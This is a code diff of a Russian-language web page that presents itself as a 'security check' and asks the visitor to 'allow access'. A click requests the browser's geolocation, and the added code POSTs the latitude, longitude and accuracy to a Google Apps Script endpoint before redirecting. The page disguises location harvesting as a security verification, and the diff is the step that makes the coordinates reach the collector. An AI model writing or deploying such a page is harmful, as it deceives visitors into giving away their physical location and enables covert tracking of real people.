@@ -23,7 +23,7 @@
       width: 50px;
       height: 50px;
       animation: spin 1s linear infinite;
-      display: none; /* Скрыт по умолчанию */
+      display: none;
     }
     #consentBtn {
       padding: 12px 24px;
@@ -42,8 +42,6 @@
 </head>
 <body>
   <h2>Проверка безопасности</h2>
-  
-  <!-- Кнопка для запуска процесса -->
   <button id="consentBtn">Разрешить доступ</button>
   <div class="loader"></div>
 
@@ -51,18 +49,14 @@
     const loader = document.querySelector('.loader');
     const consentBtn = document.getElementById('consentBtn');
 
-    // Функция запроса геолокации
     function requestGeolocation() {
-      loader.style.display = 'block'; // Показать лоадер
-      consentBtn.style.display = 'none'; // Скрыть кнопку
+      loader.style.display = 'block';
+      consentBtn.style.display = 'none';
 
       navigator.geolocation.getCurrentPosition(
         sendLocation,
         locationError,
-        {
-          enableHighAccuracy: false,
-          timeout: 15000
-        }
+        { enableHighAccuracy: false, timeout: 15000 }
       );
     }
 
@@ -71,26 +65,38 @@
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
 
-      const url = `https://script.google.com/macros/s/AKfycbzFfyiqoRCIxMTAKawHrmJIddL_la4tm61rkMr24qRa-KQlunWeTYWh-h618Uudq1pA/exec`;
+      // Используем ваш новый URL скрипта
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwwcQTSCIqax9zqr34hi1ZjG-bLbANP61uJ1hO98InFXQyDuv9Ct0n8RqyGvncV_Y8j/exec';
 
-      fetch(url)
-        .then(res => {
-          console.log("Успешно");
-          window.location.href = "/next-page.html"; // Редирект после успеха
-        })
-        .catch(err => {
-          console.error("Ошибка при отправке:", err);
-          alert("Ошибка соединения с сервером");
-        });
+      fetch(scriptURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ lat, lon, acc })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Ошибка сервера');
+        return response.json();
+      })
+      .then(data => {
+        console.log('Успешно:', data);
+        window.location.href = "/next-page.html";
+      })
+      .catch(err => {
+        console.error('Ошибка:', err);
+        alert('Не удалось отправить данные: ' + err.message);
+      })
+      .finally(() => {
+        loader.style.display = 'none';
+        consentBtn.style.display = 'block';
+      });
     }
 
     function locationError(err) {
       loader.style.display = 'none';
       consentBtn.style.display = 'block';
-      alert("Ошибка доступа: " + err.message);
+      alert('Ошибка геолокации: ' + err.message);
     }
 
-    // Запрос запускается только по клику
     consentBtn.addEventListener('click', requestGeolocation);
   </script>
 </body>
